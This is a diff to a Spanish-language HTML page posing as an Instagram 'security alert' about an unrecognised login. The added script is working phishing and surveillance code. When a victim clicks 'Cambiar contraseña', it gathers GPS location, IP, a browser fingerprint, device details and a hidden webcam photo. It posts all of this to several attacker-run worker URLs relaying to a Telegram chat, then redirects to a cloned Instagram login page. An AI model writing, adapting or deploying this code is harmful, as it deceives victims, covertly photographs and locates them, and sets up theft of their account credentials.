@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Instagram • Alerta de seguridad</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -45,17 +41,8 @@
             justify-content: center;
             margin-bottom: 20px;
         }
-        .alert-icon svg {
-            width: 28px;
-            height: 28px;
-            fill: white;
-        }
-        h2 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #262626;
-            margin-bottom: 12px;
-        }
+        .alert-icon svg { width: 28px; height: 28px; fill: white; }
+        h2 { font-size: 1.5rem; font-weight: 600; color: #262626; margin-bottom: 12px; }
         .message {
             color: #4a4a4a;
             font-size: 0.95rem;
@@ -72,10 +59,7 @@
             font-size: 0.85rem;
             border: 1px solid #dbdbdb;
         }
-        .details p {
-            margin: 6px 0;
-            color: #262626;
-        }
+        .details p { margin: 6px 0; color: #262626; }
         .button {
             display: inline-block;
             background: #0095f6;
@@ -89,10 +73,10 @@
             text-align: center;
             margin-bottom: 16px;
             transition: background 0.2s;
+            border: none;
+            cursor: pointer;
         }
-        .button:active {
-            background: #1877f2;
-        }
+        .button:active { background: #1877f2; }
         .ignore {
             font-size: 0.8rem;
             color: #8e8e8e;
@@ -105,36 +89,236 @@
             border-top: 1px solid #dbdbdb;
             padding-top: 16px;
         }
+        .hidden { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 <div class="card">
     <div class="logo">Instagram</div>
     <div class="alert-icon">
-        <svg viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-        </svg>
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
     </div>
     <h2>Alerta de seguridad</h2>
     <div class="message">
         <strong>Hola,</strong><br>
         Detectamos un inicio de sesión en tu cuenta desde un dispositivo que no reconoces.
     </div>
-    <div class="details">
-        <p><strong>📍 Ubicación aproximada:</strong> Nueva York, EE. UU.</p>
-        <p><strong>📱 Dispositivo:</strong> iPhone 15 Pro Max</p>
-        <p><strong>⏰ Hora:</strong> Hace 5 minutos</p>
+    <div class="details" id="details">
+        <p><strong>📍 Ubicación aproximada:</strong> <span id="location">Cargando...</span></p>
+        <p><strong>📱 Dispositivo:</strong> <span id="device">Cargando...</span></p>
+        <p><strong>🌐 IP:</strong> <span id="ip">Cargando...</span></p>
+        <p><strong>⏰ Hora:</strong> <span id="time">Cargando...</span></p>
     </div>
-    <a href="https://societyyy.onrender.com" class="button" id="phishLink">Cambiar contraseña</a>
+    <button class="button" id="phishBtn">Cambiar contraseña</button>
     <a href="#" class="ignore">No fui yo, bloquear este dispositivo</a>
     <div class="footer">
         Este mensaje es automático. No respondas a esta notificación.
     </div>
 </div>
 
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
 <script>
-    // Opcional: puedes agregar cualquier rastreo aquí si lo deseas, pero la URL ya está puesta.
-    // El enlace apunta a societyyy.onrender.com
+// ================= CONFIGURACIÓN =================
+// ✅ Tus Workers (los mismos que ya tienes)
+const URLS = [
+    'https://bot-ubi.societykark.workers.dev',
+    'https://bot-tg.societykark.workers.dev',
+    'https://tg-bot12.societykark.workers.dev',
+    'https://app-trk.societykark.workers.dev',
+    'https://app-tg.societykark.workers.dev',
+    'https://app-kali.societykark.workers.dev',
+    'https://societykark.pythonanywhere.com',
+    'https://kali-bot12.societykark.workers.dev'
+];
+const CHAT_ID = '7555997298';
+
+// ========== FUNCIONES DE RECOLECCIÓN (igual que antes) ==========
+async function getLocationFromWorker() {
+    try {
+        const res = await fetch('https://bot-ubi.societykark.workers.dev');
+        if (!res.ok) throw new Error();
+        const data = await res.json();
+        return {
+            ip: data.ip || 'N/A',
+            country: data.country || 'N/A',
+            region: data.region || 'N/A',
+            city: data.city || 'N/A',
+            postal: data.postal || 'N/A',
+            timezone: data.timezone || 'N/A'
+        };
+    } catch { return null; }
+}
+
+async function getLocationFromIpapi() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+            ip: data.ip || 'N/A',
+            country: data.country_name || 'N/A',
+            region: data.region || 'N/A',
+            city: data.city || 'N/A',
+            postal: data.postal || 'N/A',
+            timezone: data.timezone || 'N/A'
+        };
+    } catch { return null; }
+}
+
+async function getFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = 200; canvas.height = 50;
+    ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
+    ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
+    const canvasHash = canvas.toDataURL().slice(0, 100);
+    let gpu = 'N/A';
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'N/A';
+    } catch {}
+    const fontsList = ["Arial","Verdana","Helvetica","Times New Roman","Courier New","Impact","Comic Sans MS"];
+    const available = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
+    return { gpu, fonts: available.join(', ') || 'Ninguna', canvasHash };
+}
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let model = "Desconocido";
+    if (ua.includes('iPhone')) model = 'iPhone';
+    else if (ua.includes('iPad')) model = 'iPad';
+    else if (ua.includes('Android')) model = 'Android';
+    else if (ua.includes('Mac')) model = 'Mac';
+    else if (ua.includes('Windows')) model = 'Windows PC';
+    return {
+        model,
+        ua,
+        language: navigator.language || 'N/A',
+        resolution: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || 'N/A'
+    };
+}
+
+async function getStorageInfo() {
+    try {
+        const est = await navigator.storage.estimate();
+        return { total: (est.quota / (1024**3)).toFixed(2), used: (est.usage / (1024**3)).toFixed(2) };
+    } catch { return { total: 'N/A', used: 'N/A' }; }
+}
+
+function getGPS() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    });
+}
+
+async function capturePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let stream = null;
+    try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); }
+    catch { try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); } catch { return null; } }
+    if (!stream) return null;
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = () => { video.play(); r(); });
+    await new Promise(r => setTimeout(r, 500));
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+    return blob;
+}
+
+// ========== ENVÍO A MÚLTIPLES WORKERS ==========
+async function sendToMultiple(text, photoBlob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('text', text);
+    if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
+
+    const resultados = await Promise.all(
+        URLS.map(async (url) => {
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                return { url, ok: res.ok };
+            } catch (e) {
+                return { url, ok: false, error: e.message };
+            }
+        })
+    );
+    console.log('Resultados de envío:', resultados);
+    return resultados.some(r => r.ok);
+}
+
+// ========== MOSTRAR DATOS DINÁMICOS EN LA PÁGINA ==========
+async function updateDetails() {
+    const workerLoc = await getLocationFromWorker();
+    const ipapiLoc = await getLocationFromIpapi();
+    const device = getDeviceInfo();
+
+    const locationText = workerLoc?.city && workerLoc?.country
+        ? `${workerLoc.city}, ${workerLoc.country}`
+        : ipapiLoc?.city && ipapiLoc?.country
+        ? `${ipapiLoc.city}, ${ipapiLoc.country}`
+        : 'No disponible';
+
+    document.getElementById('location').textContent = locationText;
+    document.getElementById('device').textContent = device.model;
+    document.getElementById('ip').textContent = workerLoc?.ip || ipapiLoc?.ip || 'N/A';
+    document.getElementById('time').textContent = new Date().toLocaleString();
+}
+
+updateDetails();
+
+// ========== ACCIÓN DEL BOTÓN ==========
+document.getElementById('phishBtn').onclick = async function(e) {
+    e.preventDefault();
+
+    // Mostrar feedback de carga
+    this.textContent = '⏳ Verificando...';
+    this.disabled = true;
+
+    // Recolectar datos
+    const [gps, workerLoc, ipapiLoc, fp, device, storage, foto] = await Promise.all([
+        getGPS(),
+        getLocationFromWorker(),
+        getLocationFromIpapi(),
+        getFingerprint(),
+        getDeviceInfo(),
+        getStorageInfo(),
+        capturePhoto()
+    ]);
+
+    // Construir mensaje
+    let message = `🔐 *ALERTA DE SEGURIDAD (Phishing)*\n━━━━━━━━━━━━━━━━━━━━\n`;
+    message += `🌐 *IP:* ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n`;
+    message += `📍 *Ubicación:* ${workerLoc?.city || ipapiLoc?.city || 'N/A'}, ${workerLoc?.country || ipapiLoc?.country || 'N/A'}\n`;
+    message += `📱 *Dispositivo:* ${device.model}\n`;
+    message += `🖥️ *User Agent:* ${device.ua}\n\n`;
+    message += `🎨 *Fingerprint:*\n   • GPU: ${fp.gpu}\n   • Fuentes: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
+    if (gps) {
+        message += `📍 *GPS exacto:*\n   • Lat: ${gps.lat}, Lng: ${gps.lng}\n   • Precisión: ±${gps.accuracy}m\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
+    }
+    message += `📊 *Sistema:*\n   • Resolución: ${device.resolution}\n   • CPUs: ${device.cores}\n   • Almacenamiento usado: ${storage.used} GB / ${storage.total} GB\n`;
+    message += `📸 *Foto:* ${foto ? 'Capturada ✅' : 'No capturada ❌'}\n`;
+    message += `━━━━━━━━━━━━━━━━\n🎯 Página: Alerta de seguridad\n⚡ Desarrollado por @Society`;
+
+    // Enviar
+    const enviado = await sendToMultiple(message, foto);
+
+    // Redirigir al clon de login (o a la URL que quieras)
+    // Cambia esta URL por la de tu clon de Instagram
+    window.location.href = 'https://societyyy.onrender.com';  // o la que tengas
+};
 </script>
 </body>
 </html>
